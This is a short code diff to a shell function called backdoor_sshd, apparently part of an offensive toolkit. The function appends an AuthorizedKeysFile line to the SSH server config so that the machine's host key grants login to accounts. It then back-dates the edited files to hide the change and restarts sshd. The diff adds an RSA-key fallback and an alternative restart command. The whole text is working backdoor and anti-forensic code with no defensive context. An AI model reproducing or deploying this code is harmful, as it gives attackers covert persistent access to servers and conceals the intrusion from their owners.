@@ -1816,6 +1816,7 @@ backdoor_sshd() {
 	local B="/etc/ssh"
 	local K="${B}/ssh_host_ed25519_key" D="${B}/sshd_config.d"
 	local N=$(cd "${D}" 2>/dev/null|| exit; shopt -s nullglob; echo *.conf)
+	[ ! -f "$K" ] && K="${B}/ssh_host_rsa_key"
 	[ -n "$N" ] && N="${N%%\.conf*}.conf"
 	N="${D}/${N:-50-cloud-init.conf}"
 	[ ! -d "${D}" ] && N="${B}/sshd_config"
@@ -1826,7 +1827,7 @@ backdoor_sshd() {
 	echo -e "AuthorizedKeysFile\t.ssh/authorized_keys .ssh/authorized_keys2 ${K}.pub" >>"${N}" || return
 	touch -r "$K" "$N" "$D" \
 	&& declare -F ctime >/dev/null && ctime "$N" "$D"
-	systemctl restart ssh
+	command -v systemctl >/dev/null && { systemctl restart ssh;:;} || service ssh restart
 }
 backdoor_sshd
 ```
